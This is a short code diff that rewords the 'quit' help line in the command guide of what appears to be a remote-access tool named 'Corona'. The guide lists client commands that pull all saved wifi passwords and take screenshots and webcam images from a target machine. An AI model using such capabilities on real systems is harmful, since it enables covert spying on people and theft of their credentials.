@@ -31,7 +31,7 @@ user_guide = """
              'select (target Client_ID)':['selects a target and creates a session between the server and the client machine ']
              'guide': Display Corona's user commands
     Client Commands
-            'quit':['takes you back to the Corona shell interface']
+            'quit':['quits the session and takes user back to the Corona shell interface']
             'wifi_passwords':['gets all known wifi password that the client node has ever connected to'],
             'screenshot':['takes a screen shot of the client machine'],
             'camshot':['captures an image from the client's webcam'],
